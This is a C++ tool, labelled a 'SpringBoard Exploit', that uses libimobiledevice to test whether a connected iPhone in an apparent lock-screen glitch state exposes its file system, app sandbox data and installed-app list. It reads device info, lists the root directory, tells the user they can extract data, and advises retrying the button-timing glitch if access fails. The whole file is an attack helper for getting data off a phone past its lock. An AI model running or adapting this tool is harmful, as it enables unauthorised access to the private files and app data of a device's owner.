/**
 * iOS Service Probe - Tests accessibility of iOS services
 * Attempts to connect to various lockdownd services during glitch state
 */

#include <iostream>
#include <string>
#include <vector>
#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/afc.h>
#include <libimobiledevice/installation_proxy.h>
#include <libimobiledevice/house_arrest.h>

struct ServiceInfo {
    std::string name;
    std::string description;
    bool critical;
};

class ServiceProbe {
private:
    std::vector<ServiceInfo> services;

    void init_services() {
        services = {
            {"com.apple.afc", "Apple File Conduit (File System)", true},
            {"com.apple.mobile.house_arrest", "App Sandbox Access", true},
            {"com.apple.crashreportcopymobile", "Crash Reports", true},
            {"com.apple.syslog_relay", "System Logs", false},
            {"com.apple.mobile.diagnostics_relay", "Diagnostics", false},
            {"com.apple.mobile.installation_proxy", "App Installation Info", true},
            {"com.apple.mobile.notification_proxy", "Notifications", false},
            {"com.apple.misagent", "Provisioning Profiles", false},
            {"com.apple.mobile.file_relay", "System File Access", true},
            {"com.apple.mobile.screenshot", "Screenshots", false},
            {"com.apple.pcapd", "Packet Capture", false},
            {"com.apple.mobile.MCInstall", "Mobile Config", false},
        };
    }

public:
    ServiceProbe() {
        init_services();
    }

    bool probe_afc(idevice_t device, lockdownd_client_t client) {
        lockdownd_service_descriptor_t service = NULL;
        afc_client_t afc = NULL;

        std::cout << "[*] Probing AFC (Apple File Conduit)..." << std::endl;

        if (lockdownd_start_service(client, "com.apple.afc", &service) != LOCKDOWN_E_SUCCESS) {
            std::cout << "[-] AFC service start failed" << std::endl;
            return false;
        }

        if (afc_client_new(device, service, &afc) != AFC_E_SUCCESS) {
            std::cout << "[-] AFC client creation failed" << std::endl;
            lockdownd_service_descriptor_free(service);
            return false;
        }

        // Try to get device info
        char **info_list = NULL;
        if (afc_get_device_info(afc, &info_list) == AFC_E_SUCCESS) {
            std::cout << "[+] ✓✓✓ AFC ACCESS GRANTED!" << std::endl;
            std::cout << "[+] File system is accessible!" << std::endl;

            if (info_list) {
                std::cout << "\n[+] Device Info:" << std::endl;
                for (int i = 0; info_list[i]; i += 2) {
                    if (info_list[i+1]) {
                        std::cout << "    " << info_list[i] << ": " << info_list[i+1] << std::endl;
                    }
                }
            }

            // Try to list root directory
            char **dir_list = NULL;
            if (afc_read_directory(afc, "/", &dir_list) == AFC_E_SUCCESS) {
                std::cout << "\n[+] Root directory contents:" << std::endl;
                if (dir_list) {
                    for (int i = 0; dir_list[i]; i++) {
                        std::cout << "    " << dir_list[i] << std::endl;
                    }
                }
            }

            afc_client_free(afc);
            lockdownd_service_descriptor_free(service);
            return true;
        }

        std::cout << "[-] AFC access denied" << std::endl;
        afc_client_free(afc);
        lockdownd_service_descriptor_free(service);
        return false;
    }

    bool probe_installation_proxy(idevice_t device, lockdownd_client_t client) {
        lockdownd_service_descriptor_t service = NULL;
        instproxy_client_t instproxy = NULL;

        std::cout << "[*] Probing Installation Proxy..." << std::endl;

        if (lockdownd_start_service(client, "com.apple.mobile.installation_proxy", &service) != LOCKDOWN_E_SUCCESS) {
            std::cout << "[-] Installation proxy service start failed" << std::endl;
            return false;
        }

        if (instproxy_client_new(device, service, &instproxy) != INSTPROXY_E_SUCCESS) {
            std::cout << "[-] Installation proxy client creation failed" << std::endl;
            lockdownd_service_descriptor_free(service);
            return false;
        }

        std::cout << "[+] Installation proxy accessible" << std::endl;
        std::cout << "[+] Can query installed apps" << std::endl;

        instproxy_client_free(instproxy);
        lockdownd_service_descriptor_free(service);
        return true;
    }

    bool probe_house_arrest(idevice_t device, lockdownd_client_t client) {
        lockdownd_service_descriptor_t service = NULL;
        house_arrest_client_t house_arrest = NULL;

        std::cout << "[*] Probing House Arrest (App Sandbox)..." << std::endl;

        if (lockdownd_start_service(client, "com.apple.mobile.house_arrest", &service) != LOCKDOWN_E_SUCCESS) {
            std::cout << "[-] House arrest service start failed" << std::endl;
            return false;
        }

        if (house_arrest_client_new(device, service, &house_arrest) != HOUSE_ARREST_E_SUCCESS) {
            std::cout << "[-] House arrest client creation failed" << std::endl;
            lockdownd_service_descriptor_free(service);
            return false;
        }

        std::cout << "[+] ✓ House Arrest accessible!" << std::endl;
        std::cout << "[+] Can access app sandbox data" << std::endl;

        house_arrest_client_free(house_arrest);
        lockdownd_service_descriptor_free(service);
        return true;
    }

    void probe_all(const std::string& udid) {
        std::cout << "\n╔══════════════════════════════════════════════════════╗" << std::endl;
        std::cout << "║   iOS Service Probe - SpringBoard Exploit           ║" << std::endl;
        std::cout << "╚══════════════════════════════════════════════════════╝\n" << std::endl;

        idevice_t device = NULL;
        lockdownd_client_t client = NULL;

        std::cout << "[*] Connecting to device: " << udid << std::endl;

        if (idevice_new(&device, udid.c_str()) != IDEVICE_E_SUCCESS) {
            std::cerr << "[-] Failed to connect to device" << std::endl;
            return;
        }

        if (lockdownd_client_new_with_handshake(device, &client, "service_probe") != LOCKDOWN_E_SUCCESS) {
            std::cerr << "[-] Failed to create lockdown client" << std::endl;
            std::cerr << "[-] Device is locked or not paired" << std::endl;
            idevice_free(device);
            return;
        }

        std::cout << "[+] Lockdown client created successfully\n" << std::endl;

        // Probe critical services
        bool afc_success = probe_afc(device, client);
        std::cout << std::endl;

        bool house_arrest_success = probe_house_arrest(device, client);
        std::cout << std::endl;

        bool instproxy_success = probe_installation_proxy(device, client);
        std::cout << std::endl;

        // Summary
        std::cout << "\n╔══════════════════════════════════════════════════════╗" << std::endl;
        std::cout << "║   RESULTS                                            ║" << std::endl;
        std::cout << "╚══════════════════════════════════════════════════════╝" << std::endl;

        if (afc_success) {
            std::cout << "\n[SUCCESS] ✓✓✓ AFC (File System) is accessible!" << std::endl;
            std::cout << "[SUCCESS] You can extract data from the device!" << std::endl;
            std::cout << "[ACTION]  Run: ifuse /mnt/iphone" << std::endl;
        }

        if (house_arrest_success) {
            std::cout << "\n[SUCCESS] ✓✓✓ House Arrest (App Data) is accessible!" << std::endl;
            std::cout << "[SUCCESS] You can access app sandbox data!" << std::endl;
        }

        if (instproxy_success) {
            std::cout << "\n[INFO] Installation Proxy accessible (app list available)" << std::endl;
        }

        if (!afc_success && !house_arrest_success) {
            std::cout << "\n[FAILED] No critical services accessible" << std::endl;
            std::cout << "[INFO]   Try triggering the SpringBoard glitch again" << std::endl;
            std::cout << "[INFO]   Experiment with timing of the button sequence" << std::endl;
        }

        lockdownd_client_free(client);
        idevice_free(device);
    }
};

int main(int argc, char** argv) {
    // Get device UDID
    char **devices = NULL;
    int count = 0;

    idevice_get_device_list(&devices, &count);

    if (count == 0) {
        std::cerr << "Error: No device detected" << std::endl;
        std::cerr << "Make sure iPhone is connected via USB" << std::endl;
        return 1;
    }

    std::string udid = devices[0];
    idevice_device_list_free(devices);

    ServiceProbe probe;
    probe.probe_all(udid);

    return 0;
}
